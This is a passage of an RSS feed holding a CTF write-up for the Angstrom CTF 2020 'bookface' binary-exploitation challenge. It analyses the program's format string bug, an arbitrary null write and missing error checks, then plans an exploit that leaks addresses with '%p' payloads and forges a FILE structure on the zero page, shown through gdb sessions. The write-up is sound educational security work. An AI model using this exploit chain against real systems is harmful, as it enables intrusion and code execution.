<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on philomath213</title><link>https://philomath213.github.io/post/</link><description>Recent content in Posts on philomath213</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><lastBuildDate>Thu, 26 Mar 2020 22:14:39 +0100</lastBuildDate><atom:link href="https://philomath213.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Angstrom CTF 2020 - bookface</title><link>https://philomath213.github.io/post/angstromctf2020-bookface/</link><pubDate>Thu, 26 Mar 2020 22:14:39 +0100</pubDate><guid>https://philomath213.github.io/post/angstromctf2020-bookface/</guid><description>
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Angstrom CTF 2020&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;bookface&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;I made a new social networking service. It&amp;rsquo;s a little glitchy, but no way that could result in a data breach, right?&lt;/p&gt;
&lt;p&gt;Connect with nc pwn.2020.chall.actf.co 20733.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://files.actf.co/045bb892badfedab43024208332e2cd03072cc164e2d9c9d74aac29d0cbffeeb/bookface.tar.gz&#34; target=&#34;_blank&#34;&gt;bookface.tar.gz&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The attached tarball contains the following files:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;File&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;bookface&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;the main binary&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;bookface.c&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;binary source code&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;libc.so.6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;remote server libc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Dockerfile&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Dockerfile used to build the remote challenge&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;xinetd.conf&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;xinetd config file to run the challenge&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;server.sh&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;the executable to be launched via xinetd which will run bookface&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;tl-dl&#34;&gt;TL;DL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Leak Libc address using Format String Attack.&lt;/li&gt;
&lt;li&gt;Abusing &lt;em&gt;glibc PRNG&lt;/em&gt; by overwrite the random state using &lt;em&gt;friends&lt;/em&gt; pointer.&lt;/li&gt;
&lt;li&gt;Writing a forged &lt;em&gt;FILE&lt;/em&gt; structure in &lt;em&gt;Zero Page&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Trigger &lt;em&gt;FILE&lt;/em&gt; structure exploit by a &lt;em&gt;NULL Pointer Dereference Attack&lt;/em&gt; and exploiting a &lt;em&gt;TOCTOU&lt;/em&gt; bug.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As usually in binary exploitation, binaries are related to &lt;em&gt;libc&lt;/em&gt;, most of the time we need the libc to exploit the binary (calling &lt;em&gt;system&lt;/em&gt; function, overwriting (malloc) or &lt;em&gt;free&lt;/em&gt; hooks, using &lt;em&gt;one_gadget&lt;/em&gt;, &amp;hellip;), so it&amp;rsquo;s better to start debugging using the remote libc locally, there are many ways to achieve that.&lt;/p&gt;
&lt;p&gt;We can easily build an identical docker image to the remote challenge image using these files, but if you want to debug the binary inside a container you need to install your favorite tools (gdb with peda, pwndbg or gef extension) inside the container.&lt;/p&gt;
&lt;p&gt;The easy way that I prefer is patching the binary and modifying the &lt;em&gt;RUNPATH&lt;/em&gt; to point to the directory where the target libc is located, this technique is explained in &lt;a href=&#34;https://www.ayrx.me/about&#34; target=&#34;_blank&#34;&gt;@Ayrx&lt;/a&gt; blog post &lt;strong&gt;&amp;ldquo;Using a non-system glibc&amp;rdquo;&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ mv bookface backup
$ python change_glibc.py backup libc.so.6 ld-2.23.so bookface
Current ld.so:
Path: /lib64/ld-linux-x86-64.so.2
New ld.so:
Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so
Adding RUNPATH:
Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface
Writing new binary bookface
Please rename /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 to /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6.
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ldd backup
linux-vdso.so.1 (0x00007ffd10964000)
libc.so.6 =&amp;gt; /usr/lib/libc.so.6 (0x00007f80eaf0f000)
/lib64/ld-linux-x86-64.so.2 =&amp;gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f80eb123000)
$ ldd bookface
linux-vdso.so.1 (0x00007ffe1bbe7000)
libc.so.6 =&amp;gt; /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 (0x00007ff062cb8000)
/home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so =&amp;gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007ff0630ae000)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; You can get &lt;em&gt;ld-2.23.so&lt;/em&gt; file from the &lt;em&gt;ubuntu:xenial&lt;/em&gt; image.&lt;/p&gt;
&lt;p&gt;Now we can run the binary locally with the same libc used remotely.&lt;/p&gt;
&lt;h2 id=&#34;source-code-analysis&#34;&gt;Source Code Analysis&lt;/h2&gt;
&lt;p&gt;Since the source code is available, we don&amp;rsquo;t have to reverse engineering the binary, just read the code.&lt;/p&gt;
&lt;p&gt;For global variables we have &lt;code&gt;user&lt;/code&gt; a profile structure pointer and &lt;code&gt;uid&lt;/code&gt; an integer.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct profile *user;
int uid;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The profile structure has two fields: a &lt;em&gt;char array&lt;/em&gt; (&lt;code&gt;name&lt;/code&gt;) of size &lt;em&gt;0x100&lt;/em&gt; and a pointer to a &lt;em&gt;long long&lt;/em&gt; (&lt;code&gt;friends&lt;/code&gt;).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct profile {
char name[0x100];
long long *friends; // some people have a lot of friends
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This program first call &lt;code&gt;srand&lt;/code&gt; to set &lt;code&gt;time(NULL)&lt;/code&gt; as seed for a new sequence of pseudo-random integers to be returned by &lt;code&gt;rand()&lt;/code&gt; we will get back to this later in the writeup.&lt;/p&gt;
&lt;p&gt;Then it calls &lt;code&gt;login()&lt;/code&gt;, the &lt;code&gt;login&lt;/code&gt; function basically asks for userid and creates a file with userid as a file name under &lt;code&gt;users&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;If the file doesn&amp;rsquo;t exist, the program will call &lt;code&gt;mmap&lt;/code&gt;, this will basically allocates a memory at a random address, witg a size equals to size of &lt;code&gt;profile&lt;/code&gt; structure, the protections are &lt;em&gt;PROT_READ | PROT_WRITE&lt;/em&gt;. Then it reads &lt;em&gt;0x100&lt;/em&gt; bytes into it using &lt;code&gt;fgets&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Welcome to bookface!&amp;quot;);
user = mmap(rand() &amp;amp; 0xfffffffffffff000, sizeof(struct profile),
PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-1, 0);
printf(&amp;quot;What&#39;s your name? &amp;quot;);
fgets(user-&amp;gt;name, 0x100, stdin);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If the file already exists then it will ask for a brief survey.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Before you log back in, please complete a brief survey.&amp;quot;);
puts(&amp;quot;For each of the following categories, rate us from 1-10.&amp;quot;);
char survey[20];
int n = 0;
printf(&amp;quot;Content: &amp;quot;);
n += read(1, survey + n, 3);
printf(&amp;quot;Moderation: &amp;quot;);
n += read(1, survey + n, 3);
printf(&amp;quot;Interface: &amp;quot;);
n += read(1, survey + n, 3);
printf(&amp;quot;Support: &amp;quot;);
n += read(1, survey + n, 3);
survey[n] = 0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The program check if there is any &lt;code&gt;&#39;n&#39;&lt;/code&gt; letter in the inputs, if so the program will exit.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (strchr(survey, &#39;n&#39;) != NULL) {
// a bug bounty report said something about hacking and the letter n
puts(&amp;quot;ERROR: HACKING DETECTED&amp;quot;);
puts(&amp;quot;Exiting...&amp;quot;);
exit(1);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This would prevent users from doing arbitrary write using &lt;strong&gt;Format String Attack&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:using-the-common-n-specifier&#34;&gt;&lt;a href=&#34;#fn:using-the-common-n-specifier&#34;&gt;0&lt;/a&gt;&lt;/sup&gt;, if there is any vulnerability like that.&lt;/p&gt;
&lt;p&gt;If the survey rates are different than &lt;em&gt;10, 10, 10, 10&lt;/em&gt;, we notice the format string bug!.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (strcmp(survey, &amp;quot;10\n10\n10\n10\n&amp;quot;) != 0) {
puts(
&amp;quot;Those ratings don&#39;t seem quite right. Please review them and try &amp;quot;
&amp;quot;again:&amp;quot;);
printf(survey);
n = 0;
printf(&amp;quot;Content: &amp;quot;);
n += read(1, survey + n, 3);
printf(&amp;quot;Moderation: &amp;quot;);
n += read(1, survey + n, 3);
printf(&amp;quot;Interface: &amp;quot;);
n += read(1, survey + n, 3);
printf(&amp;quot;Support: &amp;quot;);
n += read(1, survey + n, 3);
survey[n] = 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The program will call &lt;code&gt;printf&lt;/code&gt; with user input &lt;code&gt;survey&lt;/code&gt; directly as a format string &lt;code&gt;printf(survey)&lt;/code&gt;, so we have Format String Bug here.&lt;/p&gt;
&lt;p&gt;Then it opens the file and reads its content into an allocated memory via &lt;code&gt;mmap&lt;/code&gt; the same way as mentioned above.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;user = mmap(rand() &amp;amp; 0xfffffffffffff000, sizeof(struct profile),
PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-1, 0);
FILE *f = fopen(file, &amp;quot;rb&amp;quot;);
fread(user, 1, sizeof(struct profile), f);
fclose(f);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;At the end it checks if the survey rates were different then &lt;em&gt;10, 10, 10, 10&lt;/em&gt;, it will set friends number to &lt;em&gt;0&lt;/em&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (strcmp(survey, &amp;quot;10\n10\n10\n10\n&amp;quot;) != 0) {
puts(
&amp;quot;Our survey says... you don&#39;t seem very nice. I doubt you have any &amp;quot;
&amp;quot;friends!&amp;quot;);
*(user-&amp;gt;friends) = 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;That&amp;rsquo;s all what login function does, in the other hand the &lt;code&gt;main&lt;/code&gt; function is just menu-driven while loop to choose between:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/AngstromCTF2020-bookface/screenshot0.png&#34; alt=&#34;screenshot0&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;incrementing friends number&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;printf(&amp;quot;How many friends would you like to make? &amp;quot;);
long long new;
scanf(&amp;quot; %lld&amp;quot;, &amp;amp;new);
user-&amp;gt;friends += new;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This will increments the pointer friends, it an obvious mistake.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;decrementing friends number&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;printf(&amp;quot;How many friends would you like to lose? &amp;quot;);
long long lost;
scanf(&amp;quot; %lld&amp;quot;, &amp;amp;lost);
user-&amp;gt;friends -= lost;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The same here, decrementing the pointer friends.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;deleting account&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Deleting account...\n&amp;quot;);
sprintf(file, &amp;quot;users/%d&amp;quot;, uid);
remove(file);
login();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will remove the file corresponding to userid, the call &lt;code&gt;login&lt;/code&gt; function again.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;login off&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Logging out...\n&amp;quot;);
sprintf(file, &amp;quot;users/%d&amp;quot;, uid);
FILE *f = fopen(file, &amp;quot;wb&amp;quot;);
fwrite(user, 1, sizeof(struct profile), f);
fclose(f);
login();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will write the content pointed by &lt;code&gt;user&lt;/code&gt; to the file corresponding to userid, and then will call &lt;code&gt;login&lt;/code&gt; again.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let&amp;rsquo;s get back to &lt;code&gt;login&lt;/code&gt; function, at the end if the survey rates were different then &lt;em&gt;10, 10, 10, 10&lt;/em&gt; the program do this instruction &lt;code&gt;*(user-&amp;gt;friends) = 0&lt;/code&gt; which will dereference the &lt;code&gt;friends&lt;/code&gt; &lt;code&gt;long long*&lt;/code&gt; pointer and set its content to 0 (i.e. write 8 NULL bytes where &lt;code&gt;friends&lt;/code&gt; is pointing), it means we have arbitrary 8 NULL bytes write.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Another remark:&lt;/strong&gt; The program lacks errors checking, overall there are no error checking when dealing with files (&lt;code&gt;fopen&lt;/code&gt;, &lt;code&gt;fclose&lt;/code&gt;, &lt;code&gt;fread&lt;/code&gt;).&lt;/p&gt;
&lt;h2 id=&#34;detected-vulnerabilities&#34;&gt;Detected vulnerabilities&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Format String vulnerability (&amp;ldquo;arbitrary write&amp;rdquo; isn&amp;rsquo;t included since &amp;lsquo;n&amp;rsquo; letter is filtered) in login function.&lt;/li&gt;
&lt;li&gt;Arbitrary 8 NULL bytes write via friends pointer.&lt;/li&gt;
&lt;li&gt;The lack of errors checking.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;None of these vulnerabilities on their own allow us to exploit this binary, we need to use multiples attacks to achieve code execution on the remote server.&lt;/p&gt;
&lt;p&gt;Note that the 1st line of Dockerfile contains a comment:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#IMPORTANT: on host system: sysctl vm.mmap_min_addr=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;What does it mean?&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mmap_min_addr&lt;/code&gt; is a kernel tunable that specifies the minimum virtual address that a process is allowed to mmap&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;, Allowing processes to map low values expose the system to &amp;ldquo;Kernel NULL pointer dereference&amp;rdquo; attacks&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;p&gt;It was introduced to Linux Kernel as mitigation against Null Pointer Dereference Attacks, but in our case it&amp;rsquo;s disabled since &lt;em&gt;mmap_min_addr=0&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;You can check the current value in your local machine at &lt;code&gt;/proc/sys/vm/mmap_min_addr&lt;/code&gt; (Arch linux, for other distributions maybe at a different location)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cat /proc/sys/vm/mmap_min_addr
65536
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The default value in Arch Linux is &lt;em&gt;65536&lt;/em&gt; (&lt;em&gt;0x10000&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; This a Kernel feature like ASLR, and Linux containers share the same kernel with the host machine.&lt;/p&gt;
&lt;p&gt;If you are familiar with Linux Kernel Exploitation you probably know how NULL pointer dereference happens, most of the time is due to the lack of error checking.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;FILE *f = fopen(file, &amp;quot;rb&amp;quot;);
fread(user, 1, sizeof(struct profile), f);
fclose(f);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Upon successful completion &lt;code&gt;fopen&lt;/code&gt; returns a &lt;code&gt;FILE&lt;/code&gt; pointer Otherwise, &lt;code&gt;NULL&lt;/code&gt; is returned.&lt;/p&gt;
&lt;p&gt;NULL is just a zero value, NULL pointer is 8 (or 4 in 32 bits machine) null bytes (i.e. 0x0000000000000000 or 0x00000000 in 32 bits machine).&lt;/p&gt;
&lt;p&gt;What will happen if &lt;code&gt;fopen&lt;/code&gt; fails? basically the following:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;fread(user, 1, sizeof(struct profile), (FILE *)0);
fclose((FILE *)0);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;fread&lt;/code&gt; and &lt;code&gt;fclose&lt;/code&gt; will dereference the &lt;code&gt;f&lt;/code&gt; &lt;em&gt;FILE&lt;/em&gt; pointer (&lt;code&gt;f&lt;/code&gt; will points to &lt;em&gt;0x0000000000000000&lt;/em&gt; memory address).&lt;/p&gt;
&lt;p&gt;So if we can map (allocate) memory at the &lt;em&gt;0x0000000000000000&lt;/em&gt; address (&lt;em&gt;Zero Page&lt;/em&gt;) and write a forged FILE structure there.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;fread&lt;/code&gt; and &lt;code&gt;fclose&lt;/code&gt; will simply consider it as valid FILE structure.&lt;/p&gt;
&lt;p&gt;The question is therefore: How can this helps us achieve code execution?&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gsec.hitb.org/sg2018/speakers/an-jie-yang-angelboy/&#34; target=&#34;_blank&#34;&gt;@Angelboy&lt;/a&gt; in his paper &lt;strong&gt;FILE Structures: Another Binary Exploitation Technique&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;, presented at HITB GSEC 2018 Conference proposed a new attack technique that exploits the &lt;em&gt;FILE&lt;/em&gt; structure in GNU C Library (&lt;em&gt;glibc&lt;/em&gt;) to gain control over execution flow (&lt;em&gt;RIP&lt;/em&gt;), this technique won&amp;rsquo;t only get &lt;em&gt;RIP&lt;/em&gt; control, but also control over &lt;em&gt;RDI&lt;/em&gt;, &lt;em&gt;RSI&lt;/em&gt; and &lt;em&gt;RDX&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;The attack is illustrated in &lt;a href=&#34;https://dhavalkapil.com/about/&#34; target=&#34;_blank&#34;&gt;@Dhaval Kapil&lt;/a&gt; blog post &lt;strong&gt;FILE Structure Exploitation (&amp;lsquo;vtable&amp;rsquo; check bypass)&lt;/strong&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34;&gt;5&lt;/a&gt;&lt;/sup&gt;, it calls &lt;code&gt;fclose&lt;/code&gt; with a forged FILE structure, this structure contains &lt;code&gt;vtable&lt;/code&gt;, which is a pointer to a table contains functions that will be called when the original &lt;code&gt;FILE&lt;/code&gt; pointer is used to perform different operations (e.g. &lt;code&gt;fclose&lt;/code&gt;, &lt;code&gt;fread&lt;/code&gt;, &lt;code&gt;fwrite&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;So what we need right now is:
1. Make &lt;code&gt;mmap&lt;/code&gt; maps a memory page at address &lt;em&gt;0x0000000000000000&lt;/em&gt;.
2. Forge a malicious FILE structure at &lt;em&gt;0x0000000000000000&lt;/em&gt;.
3. Make &lt;code&gt;fopen&lt;/code&gt; fails and return NULL in order to call &lt;code&gt;fclose((FILE *)0)&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;libc-pie-leak&#34;&gt;LIBC + PIE Leak&lt;/h3&gt;
&lt;p&gt;The binary comes with all protection schemes + ASLR enabled.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ checksec --file bookface
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We need to leak some addresses to bypass &lt;code&gt;PIE&lt;/code&gt; and &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll use Format String Attack to get leak to address in the stack, to get to that we need to provide a userid then logout and use the same userid.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll set a breakpoint at &lt;code&gt;*login+501&lt;/code&gt; where the program calls &lt;code&gt;printf(survey)&lt;/code&gt; and observe what&amp;rsquo;s in the stack at that point.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ gdb-gef bookface
...
gef&amp;gt; break *login+820
Breakpoint 1 at 0x449e
gef&amp;gt; run
Starting program: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface
Please enter your user ID: 2130
Welcome to bookface!
What&#39;s your name? ABCD
You have 0 friends. What would you like to do?
[1] Make friends
[2] Lose friends
[3] Delete account
[4] Log out
&amp;gt; 4
Logging out...
Please enter your user ID: 2130
Before you log back in, please complete a brief survey.
For each of the following categories, rate us from 1-10.
Content: %p%p%p%p%p
Moderation: Interface: Support: Those ratings don&#39;t seem quite right. Please review them and try again:
...
gef&amp;gt; info frame
Stack level 0, frame at 0x7fffffffdef0:
rip = 0x55555555849e in login; saved rip = 0x555555558985
called by frame at 0x7fffffffdf60
Arglist at 0x7fffffffdee0, args:
Locals at 0x7fffffffdee0, Previous frame&#39;s sp is 0x7fffffffdef0
Saved registers:
rbp at 0x7fffffffdee0, rip at 0x7fffffffdee8
...
gef➤ telescope 32
0x00007fffffffde70│+0x0000: 0x0000000b00000000 ← $rsp
0x00007fffffffde78│+0x0008: 0x00007ffff7a9153c → &amp;lt;free+76&amp;gt; add rsp, 0x28
0x00007fffffffde80│+0x0010: &amp;quot;%p%p%p%p%p\n&amp;quot; ← $rdi
0x00007fffffffde88│+0x0018: 0x00000000000a7025 (&amp;quot;%p\n&amp;quot;?)
0x00007fffffffde90│+0x0020: 0x0000000000000000
0x00007fffffffde98│+0x0028: 0x0000000000000000
0x00007fffffffdea0│+0x0030: &amp;quot;users/2130&amp;quot;
0x00007fffffffdea8│+0x0038: 0x0000555555003033 (&amp;quot;30&amp;quot;?)
0x00007fffffffdeb0│+0x0040: 0x0000000000000000
0x00007fffffffdeb8│+0x0048: 0x00005555555581b0 → &amp;lt;_start+0&amp;gt; endbr64
0x00007fffffffdec0│+0x0050: 0x00007fffffffe030 → 0x0000000000000001
0x00007fffffffdec8│+0x0058: 0x00007ffff7a7a363 → &amp;lt;fclose+259&amp;gt; mov eax, ebp
0x00007fffffffded0│+0x0060: 0x0000000000000000
0x00007fffffffded8│+0x0068: 0xf46cff2f1bf3ec00
0x00007fffffffdee0│+0x0070: 0x00007fffffffdf50 → 0x00005555555589a0 → &amp;lt;__libc_csu_init+0&amp;gt; endbr64 ← $rbp
0x00007fffffffdee8│+0x0078: 0x0000555555558985 → &amp;lt;main+681&amp;gt; jmp 0x555555558992 &amp;lt;main+694&amp;gt;
0x00007fffffffdef0│+0x0080: 0x0000000000000001
0x00007fffffffdef8│+0x0088: 0x000003e8ffffdf70
0x00007fffffffdf00│+0x0090: 0x00007ffff7ffe168 → 0x0000555555554000 → 0x00010102464c457f
0x00007fffffffdf08│+0x0098: 0x000055555557e010 → 0x00000000fbad240c
0x00007fffffffdf10│+0x00a0: &amp;quot;users/2130&amp;quot;
0x00007fffffffdf18│+0x00a8: 0x0000555555003033 (&amp;quot;30&amp;quot;?)
0x00007fffffffdf20│+0x00b0: 0x00007fffffffdf4e → 0x5555555589a0f46c
0x00007fffffffdf28│+0x00b8: 0x0000000000000000
0x00007fffffffdf30│+0x00c0: 0x00005555555589a0 → &amp;lt;__libc_csu_init+0&amp;gt; endbr64
0x00007fffffffdf38│+0x00c8: 0x00005555555581b0 → &amp;lt;_start+0&amp;gt; endbr64
0x00007fffffffdf40│+0x00d0: 0x00007fffffffe030 → 0x0000000000000001
0x00007fffffffdf48│+0x00d8: 0xf46cff2f1bf3ec00
0x00007fffffffdf50│+0x00e0: 0x00005555555589a0 → &amp;lt;__libc_csu_init+0&amp;gt; endbr64
0x00007fffffffdf58│+0x00e8: 0x00007ffff7a2d830 → &amp;lt;__libc_start_main+240&amp;gt; mov edi, eax
0x00007fffffffdf60│+0x00f0: 0x0000000000000001
0x00007fffffffdf68│+0x00f8: 0x00007fffffffe038 → 0x00007fffffffe332 → &amp;quot;/home/philomath213/Documents/CTFs/angstromctf2020/[...]&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The login function stack frame is located at &lt;em&gt;0x7fffffffdef0&lt;/em&gt; (&lt;em&gt;$rsp+0x0090&lt;/em&gt;), and the saved return address is located at &lt;em&gt;0x7fffffffdee8&lt;/em&gt; (&lt;em&gt;$rsp+0x0078&lt;/em&gt;) this pointer will give us the binary base where it&amp;rsquo;s loaded, there is another interesting pointer at &lt;em&gt;0x00007fffffffdf58&lt;/em&gt; (&lt;em&gt;$rsp+0x00e8&lt;/em&gt;) a libc pointer, it will give us libc base address.&lt;/p&gt;
&lt;p&gt;The format string offset for the 1st pointer will be &lt;em&gt;21&lt;/em&gt; (&lt;code&gt;%21$p&lt;/code&gt;) while the 2nd will be &lt;em&gt;35&lt;/em&gt; (&lt;code&gt;%35$p&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;In order to calculate the base address from these two pointers we need precalculate the offsets.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gef&amp;gt; vmmap
Start End Offset Perm Path
0x0000555555554000 0x0000555555558000 0x0000000000000000 r-- /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface
...
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The binary base address is &lt;em&gt;0x0000555555554000&lt;/em&gt; and the leaked address is &lt;em&gt;0x0000555555558985&lt;/em&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gef&amp;gt; p 0x0000555555558985 - 0x0000555555554000
$1 = 0x4985
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We do the same for libc address.&lt;/p&gt;
